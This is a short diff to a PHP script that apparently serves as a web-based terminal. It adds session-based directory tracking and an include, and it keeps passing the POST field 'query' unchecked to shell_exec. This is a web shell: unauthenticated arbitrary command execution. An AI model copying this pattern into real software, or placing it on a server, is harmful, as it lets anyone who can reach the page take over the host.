@@ -1,11 +1,23 @@
 <?php
 
-    $nav = getcwd();
+    session_start();
+    $root = getcwd();
     $exec = NULL;
+    echo $root;
 
     if (isset($_POST['query']))
     {
-        $exec = shell_exec($_POST['query']);
+        include_once('commands/utility.php');
+        if (isset($_SESSION['currentdir']))
+        {
+            chdir($_SESSION['currentdir']);
+            $exec = shell_exec($_POST['query']);
+        }
+
+        else
+            $exec = shell_exec($_POST['query']);
+
+        chdir($root);
     }
 
     ## Generate markup & style
